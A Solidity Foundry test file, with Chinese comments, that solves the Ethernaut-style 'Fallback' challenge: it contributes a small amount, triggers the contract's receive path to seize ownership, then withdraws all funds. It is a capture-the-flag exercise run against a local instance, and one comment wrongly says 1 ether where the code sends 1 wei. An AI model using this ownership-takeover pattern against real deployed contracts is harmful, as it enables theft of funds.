// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./FallbackFactory.sol";

contract FallbackTest is Test {
    FallbackFactory factory;

    function setUp() public {
        // 工厂合约实例
        factory = new FallbackFactory();
    }

    function testFallback() public {
        // 工厂合约创建实例，并将其地址存储在fallBack变量中
        address fallBack = factory.createInstance(address(this));

        // 调用Fallback合约的contribute函数，向fallBack合约转账1个以太币。
        Fallback(payable(fallBack)).contribute{value: 1}();

        // 向fallBack合约转账1 wei
        (bool success, bytes memory data) = payable(fallBack).call{value: 1}(
            ""
        );
        if (!success) {
            revert(string(data));
        }

        // 获取fallBack合约的所有者地址，并将其与当前合约的地址进行比较。
        address owner = Fallback(payable(fallBack)).owner();

        assertEq(owner, address(this));

        // 调用Fallback合约的withdraw函数，从fallBack合约中提取资金。
        Fallback(payable(fallBack)).withdraw();

        // 验证fallBack合约是否满足条件
        assertTrue(factory.validateInstance(payable(fallBack), address(this)));
    }

    receive() external payable {}
}
